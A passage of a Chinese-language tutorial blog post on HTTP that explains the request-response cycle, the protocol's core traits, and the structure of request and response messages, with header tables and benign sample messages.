<li><p>服务器发现客户端想要根目录 <code>/</code> 的资源，于是找到对应的 <code>index.html</code> 文件，并准备一个<strong>响应报文</strong>：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1256</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span>...</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>服务器将这个响应报文通过 TCP 连接发回给浏览器。</p>
</li>
</ul>
</li>
<li><p><strong>【传输层】关闭 TCP 连接</strong>：</p>
<ul>
<li>浏览器接收完所有响应数据后，根据 HTTP 头部（如 <code>Connection: keep-alive</code>）的指示，决定是保持连接以便后续请求复用，还是通过“<strong>四次挥手</strong>”关闭这条 TCP 连接。</li>
</ul>
</li>
<li><p><strong>【应用层】浏览器渲染</strong>：</p>
<ul>
<li>浏览器收到响应报文，解析其中的 HTML 内容，并将其渲染成你看到的五彩斑斓的网页。如果 HTML 中还引用了其他资源（如 CSS 文件、图片），浏览器会<strong>重复上述过程</strong>（从第2步或第3步开始）去获取这些资源。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="3-HTTP-的核心特点"><a href="#3-HTTP-的核心特点" class="headerlink" title="3. HTTP 的核心特点"></a>3. HTTP 的核心特点</h2><h3 id="3-1-C-S-架构"><a href="#3-1-C-S-架构" class="headerlink" title="3.1 C&#x2F;S 架构"></a>3.1 C&#x2F;S 架构</h3><p>这是 HTTP 最基本的运作模型。</p>
<ul>
<li><strong>定义</strong>：<br>在 HTTP 通信中，角色被明确地划分为两方：<ol>
<li><strong>客户端 (Client)</strong>：发起请求的一方。它主动向服务器请求资源。我们日常使用的网页浏览器 (Chrome, Firefox)、手机 App、或者命令行工具 cURL 都属于客户端。</li>
<li><strong>服务器 (Server)</strong>：接收请求并提供响应的一方。它被动地等待客户端的请求，并根据请求内容返回相应的资源（如 HTML 页面、图片、数据等）。常见的 Web 服务器有 Apache, Nginx, Tomcat 等。</li>
</ol>
</li>
<li><strong>通信流程</strong>：<ol>
<li>通信总是由<strong>客户端</strong>发起。</li>
<li>服务器<strong>不能</strong>主动向客户端推送信息。（<em>注：这在传统 HTTP 模型中是成立的，像 WebSocket、Server-Sent Events 等技术是为了突破这一限制而出现的</em>）。</li>
<li>一次完整的交互是“客户端请求 -&gt; 服务器响应”的循环。</li>
</ol>
</li>
<li><strong>意义</strong>：<br>这种职责分离的模式极大地促进了 Web 的发展。客户端和服务器可以独立发展和演进，只要它们都遵守 HTTP 这套共同的协议。服务器可以专注于提供高性能、高可用的服务；而客户端则可以专注于提供丰富的用户界面和交互体验。</li>
</ul>
<hr>
<h3 id="3-2-简单可扩展"><a href="#3-2-简单可扩展" class="headerlink" title="3.2 简单可扩展"></a>3.2 简单可扩展</h3><p>这是 HTTP 能够长盛不衰、适应时代变化的关键。</p>
<ul>
<li><strong>简单 (Simple)</strong>：<ul>
<li>HTTP&#x2F;1.1 及之前的版本，其报文（请求和响应）是<strong>人类可读的纯文本</strong>。</li>
<li>其基本结构非常简单，由“起始行 + 头部 + 空行 + 实体”构成。这种简洁性使得早期开发者很容易实现和调试 HTTP 客户端与服务器。</li>
<li>例如，一个最简单的 <code>GET</code> 请求可以手动通过 <code>telnet</code> 工具打出来，非常直观。</li>
</ul>
</li>
<li><strong>可扩展 (Extensible)</strong>：<ul>
<li>这是 HTTP 最强大的特性。HTTP 协议的核心只定义了基本的框架（如请求方法、URL、状态码），但通过<strong>HTTP 头部 (Headers)</strong>，它可以被无限扩展。</li>
<li>头部是 <code>Key: Value</code> 格式的键值对，允许客户端和服务器之间传递任意的元数据。</li>
<li>当需要增加新功能时，通常只需要<strong>定义一个新的头部字段</strong>即可，而无需改变协议的整体结构。</li>
</ul>
</li>
<li><strong>例子</strong>：<ul>
<li>为了解决“无状态”问题，引入了 <code>Cookie</code> 和 <code>Set-Cookie</code> 头部。</li>
<li>为了提高性能，引入了 <code>Cache-Control</code> 头部用于缓存控制，引入了 <code>Content-Encoding</code> 头部用于数据压缩。</li>
<li>为了增强安全性，引入了 <code>Content-Security-Policy</code>, <code>Strict-Transport-Security</code> 等安全相关的头部。</li>
<li>开发者甚至可以自定义以 <code>X-</code> 开头的头部（现在已不推荐，可以直接使用自定义名称）来传递应用特定的信息。</li>
</ul>
</li>
<li><strong>意义</strong>：<br>可扩展性使得 HTTP 可以根据不断出现的新需求（如身份验证、缓存、数据压缩、安全策略等）添加新的头部，从而在 30 多年的发展中保持了强大的生命力。</li>
</ul>
<hr>
<h3 id="3-3-无状态"><a href="#3-3-无状态" class="headerlink" title="3.3 无状态"></a>3.3 无状态</h3><p>这个特点既是优点也是“缺点”，深刻影响了 Web 应用的开发模式。</p>
<ul>
<li><strong>定义</strong>：<br>“无状态”指的是<strong>协议本身对于事务处理没有记忆能力</strong>。每一次 HTTP 请求都是完全独立的，服务器不会保留前一次请求的任何信息。<ul>
<li>换句话说，服务器处理完一个请求并发送响应后，它就<strong>完全忘记了</strong>与这个客户端之间发生过的一切。</li>
<li>当同一个客户端再次发送请求时，服务器无法知道它就是刚才那个客户端。</li>
</ul>
</li>
<li><strong>类比</strong>：<br>可以想象成<strong>与一个记忆只有七秒的鱼对话</strong>。<ol>
<li>你问它：“你好吗？” 它回答：“我很好。” 然后它就忘了你。</li>
<li>你接着问：“我叫什么名字？” 它无法回答，因为它不记得你刚刚跟它打过招呼。</li>
<li>如果你想让它记住你，你必须在每次提问时都重新自我介绍：“你好，我叫小明。我叫什么名字？”</li>
</ol>
</li>
<li><strong>优点 (Scalability)</strong>：<ul>
<li><strong>简化服务器设计</strong>：服务器不需要花费额外的资源（如内存）来存储海量的客户端状态信息。</li>
<li><strong>提升服务器的可伸缩性</strong>：由于服务器不存储状态，任何一台服务器都可以处理任何一个客户端的请求。这使得在服务器集群中做<strong>负载均衡</strong>变得非常容易。如果一台服务器宕机，请求可以无缝切换到另一台，因为新服务器不需要任何历史上下文。</li>
</ul>
</li>
<li><strong>缺点与解决方案</strong>：<ul>
<li><strong>功能受限</strong>：然而，现代 Web 应用（如购物车、用户登录）恰恰需要“记住状态”。</li>
<li><strong>解决方案</strong>：为了弥补 HTTP 的无状态性，Web 应用通过<strong>Cookie 和 Session 机制</strong>来“创造”状态。<ul>
<li><strong>Cookie</strong>: 服务器通过 <code>Set-Cookie</code> 响应头给客户端一个“通行证”（一小段文本）。</li>
<li>之后，客户端在每次请求时都会通过 <code>Cookie</code> 请求头带上这个“通行证”。</li>
<li>服务器通过检查这个“通行证”就能识别出用户，从而维持登录状态或购物车内容。</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-4-可靠传输"><a href="#3-4-可靠传输" class="headerlink" title="3.4 可靠传输"></a>3.4 可靠传输</h3><p>HTTP 本身不负责传输的可靠性，它“站在了巨人的肩膀上”。</p>
<ul>
<li><strong>定义</strong>：<br>HTTP 协议通常是构建在<strong>传输层的 TCP 协议</strong>之上的。TCP 是一个<strong>可靠的</strong>传输协议，它为 HTTP 提供了以下保障：<ol>
<li><strong>数据完整性</strong>：通过校验和机制，确保数据在传输过程中没有损坏。</li>
<li><strong>按序到达</strong>：确保数据包能够按照发送的顺序被接收端正确地重组。</li>
<li><strong>无丢失</strong>：通过确认和重传机制，确保所有发送的数据都能到达目的地。</li>
</ol>
</li>
<li><strong>类比</strong>：<br>HTTP 协议就像是<strong>写信的人</strong>，他只负责写信的内容（请求报文&#x2F;响应报文）。而 TCP 协议就像是一个<strong>非常靠谱的邮政系统</strong>。<ul>
<li>写信的人（HTTP）把信交给邮局（TCP），就完全不用担心信件会不会寄丢、会不会被撕坏、或者信件页码会不会乱掉。</li>
<li>邮政系统（TCP）会负责安全、完整、按顺序地把信送到收件人手中。</li>
</ul>
</li>
<li><strong>意义</strong>：<br>将可靠传输的任务委托给下层的 TCP，极大地简化了 HTTP 协议的设计。HTTP 的设计者可以专注于应用层面的逻辑，即如何定义和交换超文本文档，而无需处理复杂的网络传输问题。</li>
<li><strong>演进</strong>：<br>最新的 <strong>HTTP&#x2F;3 协议改为使用 QUIC 协议</strong>，而 QUIC 是基于 UDP（一个不可靠协议）构建的。但 QUIC 协议自身内部实现了类似 TCP 的可靠性、流量控制等功能，因此，从应用层的角度看，HTTP&#x2F;3 依然享受着可靠传输的保障。</li>
</ul>
<hr>
<h1 id="二、HTTP-报文结构详解"><a href="#二、HTTP-报文结构详解" class="headerlink" title="二、HTTP 报文结构详解"></a>二、HTTP 报文结构详解</h1><h2 id="1-请求报文-Request-Message"><a href="#1-请求报文-Request-Message" class="headerlink" title="1. 请求报文 (Request Message)"></a>1. 请求报文 (Request Message)</h2><p>当客户端（如浏览器）想要从服务器获取资源或向其提交数据时，它会构造并发送一个<strong>请求报文</strong>。这个报文就像一封格式化的信件，详细说明了客户端的意图。</p>
<p>一个完整的 HTTP 请求报文由三部分组成：<strong>请求行 (Request Line)</strong>、<strong>请求头 (Request Headers)</strong> 和 <strong>请求体 (Request Body)</strong>。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;method&gt; &lt;request-target&gt; &lt;http-version&gt;  \r\n   &lt;-- 请求行</span><br><span class="line">&lt;header-key1&gt;: &lt;header-value1&gt;             \r\n   &lt;-- 请求头</span><br><span class="line">&lt;header-key2&gt;: &lt;header-value2&gt;             \r\n</span><br><span class="line">...</span><br><span class="line">&lt;header-keyN&gt;: &lt;header-valueN&gt;             \r\n</span><br><span class="line">                                          \r\n   &lt;-- 标志头部结束的空行</span><br><span class="line">&lt;request-body-data&gt;                              &lt;-- 请求体 (可选)</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：每一行的末尾都有一个回车换行符 <code>\r\n</code> (CRLF)，并且头部区域和请求体之间必须有一个<strong>空行</strong> (<code>\r\n</code>)。这个空行是强制性的，用来区分头部和主体。</p>
<hr>
<h3 id="1-1-请求行-Request-Line"><a href="#1-1-请求行-Request-Line" class="headerlink" title="1.1 请求行 (Request Line)"></a>1.1 请求行 (Request Line)</h3><p>请求行是请求报文的<strong>第一行</strong>，永远位于最开始，它简明扼要地概括了本次请求的核心信息。它由三个部分组成，以空格分隔。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.html</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>

<ol>
<li><strong>请求方法 (Method)</strong><ul>
<li><strong>作用</strong>：表明客户端希望对资源执行的操作。</li>
<li><strong>示例</strong>：<code>GET</code></li>
<li><strong>常见方法</strong>：<code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>DELETE</code>, <code>HEAD</code>, <code>OPTIONS</code> 等。<ul>
<li><code>GET</code>: 获取资源。</li>
<li><code>POST</code>: 创建或提交数据。</li>
</ul>
</li>
<li>方法是大小写敏感的，通常使用大写。</li>
</ul>
</li>
<li><strong>请求目标 (Request Target &#x2F; URI)</strong><ul>
<li><strong>作用</strong>：指定了所请求资源的位置，通常是 URL 的路径和查询参数部分。</li>
<li><strong>示例</strong>：<code>/index.html</code></li>
<li><strong>不同形式</strong>：<ul>
<li><strong>源格式 (origin-form)</strong>：最常见的形式，只包含路径和查询字符串。例如 <code>/path/to/file.html?key=value</code>。这是发送给源服务器的标准形式。</li>
<li><strong>绝对格式 (absolute-form)</strong>：包含完整的 URL。主要在请求代理服务器时使用，例如 <code>GET http://www.example.com/index.html HTTP/1.1</code>。</li>
<li><strong>星号格式 (asterisk-form)</strong>：一个星号 <code>*</code>，用于 <code>OPTIONS</code> 方法，询问服务器的整体能力，而不是特定资源。</li>
</ul>
</li>
</ul>
</li>
<li><strong>HTTP 版本 (Version)</strong><ul>
<li><strong>作用</strong>：指明客户端使用的 HTTP 协议版本。</li>
<li><strong>示例</strong>：<code>HTTP/1.1</code></li>
<li>服务器会根据这个版本来决定如何处理请求以及使用哪个版本的协议进行响应。常见的有 <code>HTTP/1.0</code>, <code>HTTP/1.1</code>, <code>HTTP/2</code>。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="1-2-请求头-Request-Headers"><a href="#1-2-请求头-Request-Headers" class="headerlink" title="1.2 请求头 (Request Headers)"></a>1.2 请求头 (Request Headers)</h3><p>请求头紧跟在请求行之后，由一系列的键值对 (<code>Key: Value</code>) 组成，每对占一行。它们向服务器提供了关于请求的更多上下文信息，例如客户端的类型、期望接收的数据格式等。</p>
<p>请求头可以分为几类（这是一个概念上的划分，实际报文中它们混在一起）：</p>
<ul>
<li><strong>通用头 (General Headers)</strong>：请求和响应报文中都可以出现，如 <code>Date</code>, <code>Connection</code>。</li>
<li><strong>请求头 (Request Headers)</strong>：专用于请求报文，包含更多关于要获取的资源或客户端本身的信息，如 <code>Host</code>, <code>User-Agent</code>, <code>Accept</code>。</li>
<li><strong>实体头 (Entity Headers)</strong>：描述请求体（或响应体）的元数据，如 <code>Content-Type</code>, <code>Content-Length</code>。</li>
</ul>
<p><strong>常用请求头详解：</strong></p>
<table>
<thead>
<tr>
<th>头部 (Header)</th>
<th>示例值</th>
<th>解释说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>Host</code></strong></td>
<td><code>www.example.com</code></td>
<td><strong>HTTP&#x2F;1.1 必需</strong>。指定了服务器的域名。这使得一台服务器可以托管多个网站（虚拟主机）。</td>
</tr>
<tr>
<td><strong><code>User-Agent</code></strong></td>
<td><code>Mozilla/5.0 (Windows NT 10.0; ...)</code></td>
<td>包含了发起请求的客户端（浏览器、爬虫等）的信息。服务器可以据此返回不同的内容或进行统计。</td>
</tr>
<tr>
<td><strong><code>Accept</code></strong></td>
<td><code>text/html,application/xhtml+xml,...</code></td>
<td>告诉服务器客户端能够理解和处理的内容类型（MIME 类型）。服务器会据此进行内容协商。</td>
</tr>
<tr>
<td><strong><code>Accept-Language</code></strong></td>
<td><code>en-US,en;q=0.9,zh-CN;q=0.8</code></td>
<td>告诉服务器客户端偏好的自然语言。<code>q</code> 是权重因子，表示偏好程度。</td>
</tr>
<tr>
<td><strong><code>Accept-Encoding</code></strong></td>
<td><code>gzip, deflate, br</code></td>
<td>告诉服务器客户端支持的内容压缩算法。服务器可以使用其中一种算法压缩响应体，以减少传输大小。</td>
</tr>
<tr>
<td><strong><code>Connection</code></strong></td>
<td><code>keep-alive</code> &#x2F; <code>close</code></td>
<td>控制 TCP 连接在请求完成后是否保持打开状态。<code>keep-alive</code> 表示长连接，<code>close</code> 表示短连接。</td>
</tr>
<tr>
<td><strong><code>Content-Type</code></strong></td>
<td><code>application/json</code></td>
<td><strong>当有请求体时非常重要</strong>。说明请求体中的数据格式。</td>
</tr>
<tr>
<td><strong><code>Content-Length</code></strong></td>
<td><code>348</code></td>
<td><strong>当有请求体时非常重要</strong>。表示请求体的字节长度。</td>
</tr>
<tr>
<td><strong><code>Cookie</code></strong></td>
<td><code>name=value; name2=value2</code></td>
<td>客户端向服务器发送之前由服务器通过 <code>Set-Cookie</code> 设置的 Cookie。用于维持用户状态。</td>
</tr>
<tr>
<td><strong><code>Referer</code></strong></td>
<td><code>https://www.google.com/</code></td>
<td>表示当前请求是从哪个页面跳转过来的。可用于分析用户来源。注意：单词拼写错误 <code>Referer</code> 是历史遗留问题。</td>
</tr>
<tr>
<td><strong><code>Authorization</code></strong></td>
<td><code>Bearer &lt;token&gt;</code></td>
<td>包含了用于身份验证的凭证信息。</td>
</tr>
</tbody></table>
<hr>
<h3 id="1-3-请求体-Request-Body"><a href="#1-3-请求体-Request-Body" class="headerlink" title="1.3 请求体 (Request Body)"></a>1.3 请求体 (Request Body)</h3><p>请求体是<strong>可选的</strong>。它用于承载需要提交给服务器的数据。</p>
<ul>
<li><strong>什么情况下会有请求体？</strong><ul>
<li><code>GET</code>, <code>HEAD</code>, <code>DELETE</code>, <code>OPTIONS</code> 等方法通常<strong>没有</strong>请求体，因为它们的操作目标由 URL 指定。</li>
<li><code>POST</code>, <code>PUT</code>, <code>PATCH</code> 等方法通常<strong>有</strong>请求体，因为它们需要向服务器发送数据（如创建新用户、更新文章内容等）。</li>
</ul>
</li>
<li><strong>常见的数据格式 (由 <code>Content-Type</code> 头部指定)：</strong><ol>
<li><strong><code>application/x-www-form-urlencoded</code></strong><ul>
<li>这是 HTML 表单提交的默认格式。</li>
<li>数据被编码成 <code>key1=value1&amp;key2=value2</code> 的形式，和 URL 查询参数的格式一样。</li>
<li>特殊字符（如空格）会被 URL 编码（空格变为 <code>+</code> 或 <code>%20</code>）。</li>
</ul>
</li>
<li><strong><code>multipart/form-data</code></strong><ul>
<li>当表单中包含文件上传（<code>&lt;input type=&quot;file&quot;&gt;</code>）时，必须使用这种格式。</li>
<li>它将表单数据分割成多个部分（part），每个部分都有自己的描述头。这种格式可以同时传输文本数据和二进制文件数据。</li>
<li>请求体会包含一个 <code>boundary</code> 字符串，用于分隔不同的数据部分。</li>
</ul>
</li>
<li><strong><code>application/json</code></strong><ul>
<li>现代 Web API（尤其是 RESTful API）最常用的格式。</li>
<li>请求体是一个 JSON 格式的字符串。</li>
<li>例如：<code>{&quot;username&quot;: &quot;alice&quot;, &quot;email&quot;: &quot;alice@example.com&quot;}</code></li>
</ul>
</li>
<li><strong><code>text/xml</code> 或 <code>application/xml</code></strong><ul>
<li>用于传输 XML 格式的数据，在早期的 Web Services (SOAP) 中很常见。</li>
</ul>
</li>
<li><strong><code>text/plain</code></strong><ul>
<li>纯文本格式。</li>
</ul>
</li>
</ol>
</li>
</ul>
<p><strong>请求报文示例 (一个典型的 POST 请求)</strong></p>
<p>这个例子模拟了一个用户登录的场景，提交的数据是 JSON 格式。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.example.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>54</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>MyCoolApiClient/1.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;testuser&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SuperSecret123&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>请求行</strong>: <code>POST /api/login HTTP/1.1</code> -&gt; 使用 POST 方法，请求 <code>/api/login</code> 资源，协议版本是 HTTP&#x2F;1.1。</li>
<li><strong>请求头</strong>:<ul>
<li><code>Host</code>: 目标服务器是 <code>api.example.com</code>。</li>
<li><code>Content-Type</code>: 告诉服务器，我发送的数据是 JSON 格式。</li>
<li><code>Content-Length</code>: 告诉服务器，请求体的大小是 54 字节。</li>
<li>其他头部提供了客户端信息和期望的响应格式。</li>
</ul>
</li>
<li><strong>空行</strong>: 分隔头部和主体。</li>
<li><strong>请求体</strong>: 包含了实际的登录凭证，是一个 JSON 对象。</li>
</ul>
<hr>
<h2 id="2-响应报文-Response-Message"><a href="#2-响应报文-Response-Message" class="headerlink" title="2. 响应报文 (Response Message)"></a>2. 响应报文 (Response Message)</h2><p>当服务器成功接收并处理了客户端的请求后，它会构建并发送一个<strong>响应报文</strong>。这个报文包含了请求的处理结果（成功、失败、重定向等）以及客户端请求的资源（如果适用）。</p>
<p>与请求报文类似，一个 HTTP 响应报文也由三部分组成：<strong>状态行 (Status Line)</strong>、<strong>响应头 (Response Headers)</strong> 和 <strong>响应体 (Response Body)</strong>。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;http-version&gt; &lt;status-code&gt; &lt;reason-phrase&gt; \r\n   &lt;-- 状态行</span><br><span class="line">&lt;header-key1&gt;: &lt;header-value1&gt;              \r\n   &lt;-- 响应头</span><br><span class="line">&lt;header-key2&gt;: &lt;header-value2&gt;              \r\n</span><br><span class="line">...</span><br><span class="line">&lt;header-keyN&gt;: &lt;header-valueN&gt;              \r\n</span><br><span class="line">                                           \r\n   &lt;-- 标志头部结束的空行</span><br><span class="line">&lt;response-body-data&gt;                               &lt;-- 响应体 (可选)</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-1-状态行-Status-Line"><a href="#2-1-状态行-Status-Line" class="headerlink" title="2.1 状态行 (Status Line)"></a>2.1 状态行 (Status Line)</h3><p>状态行是响应报文的<strong>第一行</strong>，它用最简洁的方式总结了服务器对请求的处理结果。它也由三个部分组成，以空格分隔。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>HTTP 版本 (Version)</strong><ul>
<li><strong>作用</strong>：指明服务器使用的 HTTP 协议版本。通常与客户端请求的版本相匹配。</li>
<li><strong>示例</strong>：<code>HTTP/1.1</code></li>
</ul>
</li>
<li><strong>状态码 (Status Code)</strong><ul>
<li><strong>作用</strong>：这是一个<strong>三位数的数字</strong>，是响应报文中最核心的部分。它用标准化的代码告诉客户端请求的结果。</li>
<li><strong>示例</strong>：<code>200</code></li>
<li>状态码按其第一位数字分为五大类，每一类代表一种响应状态（我们将在第三章详细讲解）：<ul>
<li><strong>1xx</strong>: 信息性 - 请求已接收，正在处理。</li>
<li><strong>2xx</strong>: 成功 - 请求已成功被接收、理解、并接受。</li>
<li><strong>3xx</strong>: 重定向 - 需要采取进一步操作才能完成请求。</li>
<li><strong>4xx</strong>: 客户端错误 - 请求有语法错误或无法实现。</li>
<li><strong>5xx</strong>: 服务器错误 - 服务器未能实现合法的请求。</li>
</ul>
</li>
</ul>
</li>
<li><strong>原因短语 (Reason Phrase)</strong><ul>
<li><strong>作用</strong>：这是对状态码的一个简短的、人类可读的文本描述。</li>
<li><strong>示例</strong>：<code>OK</code></li>
<li>原因短语的主要目的是为了方便人类阅读和调试，<strong>程序不应该依赖原因短语来判断结果</strong>，而应严格依赖状态码。例如，即使服务器返回 <code>HTTP/1.1 200 All is well</code>，客户端也应将其视为 <code>200 OK</code>。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="2-2-响应头-Response-Headers"><a href="#2-2-响应头-Response-Headers" class="headerlink" title="2.2 响应头 (Response Headers)"></a>2.2 响应头 (Response Headers)</h3><p>响应头紧跟在状态行之后，同样是一系列的键值对 (<code>Key: Value</code>)。它们提供了关于响应的更多信息，例如响应内容的类型、长度、服务器信息、缓存策略等。</p>
<p><strong>常用响应头详解：</strong></p>
<table>
<thead>
<tr>
<th>头部 (Header)</th>
<th>示例值</th>
<th>解释说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>Content-Type</code></strong></td>
<td><code>text/html; charset=utf-8</code></td>
<td><strong>极其重要</strong>。告诉客户端响应体中的数据是什么类型（MIME 类型），以及其字符编码。浏览器据此决定如何渲染内容。</td>
</tr>
<tr>
<td><strong><code>Content-Length</code></strong></td>
<td><code>1256</code></td>
<td>表示响应体的字节长度。浏览器可以据此判断响应是否已接收完整。对于长连接，这是区分报文边界的关键。</td>
</tr>
<tr>
<td><strong><code>Content-Encoding</code></strong></td>
<td><code>gzip</code></td>
<td>表明响应体使用了哪种压缩算法（如 <code>gzip</code>, <code>br</code>）。浏览器收到后需要先解压缩，才能得到原始数据。</td>
</tr>
<tr>
<td><strong><code>Server</code></strong></td>
<td><code>nginx/1.18.0</code></td>
<td>包含了处理请求的 Web 服务器软件的信息。出于安全考虑，有些服务器会隐藏或修改此信息。</td>
</tr>
<tr>
<td><strong><code>Date</code></strong></td>
<td><code>Wed, 21 Oct 2023 07:28:00 GMT</code></td>
<td>服务器生成并发送该响应的日期和时间（格林尼治标准时间）。</td>
</tr>
<tr>
<td><strong><code>Location</code></strong></td>
<td><code>https://www.example.com/new-page</code></td>
<td><strong>在 3xx 重定向响应中必需</strong>。告诉客户端应该自动跳转到这个新的 URL 去获取资源。</td>
</tr>
<tr>
<td><strong><code>Set-Cookie</code></strong></td>
<td><code>session_id=abcde12345; HttpOnly; Secure</code></td>
<td>指示客户端保存一个 Cookie。浏览器会在后续对该域名的请求中自动带上这个 Cookie。</td>
</tr>
<tr>
<td><strong><code>Cache-Control</code></strong></td>
<td><code>max-age=3600</code></td>
<td>指示客户端和代理服务器如何缓存此响应。<code>max-age=3600</code> 表示此响应可以被缓存 3600 秒。</td>
</tr>
<tr>
<td><strong><code>Expires</code></strong></td>
<td><code>Wed, 21 Oct 2023 08:28:00 GMT</code></td>
<td>(HTTP&#x2F;1.0) 提供一个绝对的过期时间，作用与 <code>Cache-Control</code> 类似，但优先级较低。</td>
</tr>
<tr>
<td><strong><code>ETag</code></strong></td>
<td><code>W/&quot;xyz...abc&quot;</code></td>
<td>资源的唯一标识符，像文件的“指纹”。用于协商缓存。</td>
</tr>
<tr>
<td><strong><code>Last-Modified</code></strong></td>
<td><code>Tue, 15 Nov 2022 12:45:26 GMT</code></td>
<td>资源在服务器上最后被修改的时间。也用于协商缓存。</td>
</tr>
</tbody></table>
<hr>
<h3 id="2-3-响应体-Response-Body"><a href="#2-3-响应体-Response-Body" class="headerlink" title="2.3 响应体 (Response Body)"></a>2.3 响应体 (Response Body)</h3><p>响应体是响应报文的<strong>可选</strong>部分，包含了服务器返回给客户端的实际资源内容。</p>
<ul>
<li><strong>什么情况下会有响应体？</strong><ul>
<li>对于成功的 <code>GET</code> 请求，响应体通常就是请求的资源本身，如 HTML 文档、图片文件、JSON 数据等。</li>
<li>对于成功的 <code>POST</code> 请求，响应体可能包含了操作成功后的结果信息，比如新建资源的信息。</li>
</ul>
</li>
<li><strong>什么情况下可能没有响应体？</strong><ul>
<li><strong><code>204 No Content</code></strong>: 请求成功，但服务器没有新的信息要发送，响应中不包含响应体。</li>
<li><strong><code>301 Moved Permanently</code> &#x2F; <code>302 Found</code></strong>: 重定向响应，客户端的关注点是 <code>Location</code> 头，通常不需要响应体。</li>
<li><strong><code>304 Not Modified</code></strong>: 协商缓存命中，告诉客户端可以使用本地缓存的副本，因此不需要再次发送资源，响应中没有响应体。</li>
<li><strong><code>HEAD</code> 请求</strong>：客户端只请求资源的元信息（头部），服务器的响应与 <code>GET</code> 请求完全相同，但<strong>没有响应体</strong>。</li>
</ul>
</li>
</ul>
<p><strong>响应报文示例 (一个典型的成功响应)</strong></p>
<p>这个例子是对一个 <code>GET</code> 请求的响应，返回了一个 HTML 页面。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1354</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 21 Oct 2023 07:30:00 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.1 (Unix)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=600</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>An Example Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello World, this is a very simple HTML document.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span 